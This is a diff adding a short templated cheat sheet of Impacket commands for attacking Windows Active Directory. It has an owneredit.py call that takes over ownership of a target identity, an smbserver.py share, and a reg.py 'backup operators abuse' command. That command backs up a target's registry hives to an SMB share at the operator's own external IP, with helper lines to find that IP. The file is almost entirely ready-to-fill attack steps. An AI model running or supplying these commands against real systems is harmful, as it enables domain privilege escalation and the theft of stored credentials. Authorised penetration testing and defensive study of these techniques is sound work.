@@ -1,0 +1,14 @@
+% impacket
+@ windows-variables
+
+# Change the owner of an identity
+owneredit.py -action write -new-owner '<user>' -target '<target>' '<domain>'/'<user_with_password>':'<password_for_user>'
+
+# smbserver
+sudo smbserver.py tmp ./ -smb2support
+
+# reg.py backup operators abuse
+reg.py '<user_with_password>:<password_for_user>@<fqdn>' backup -o '\\<external_ip>\tmp'
+
+$ interface: ip link show | awk -F': ' '{print $2}' | grep .
+$ external_ip: ip -f inet addr show <interface> | awk '/inet / {print $2}' | cut -d'/' -f1
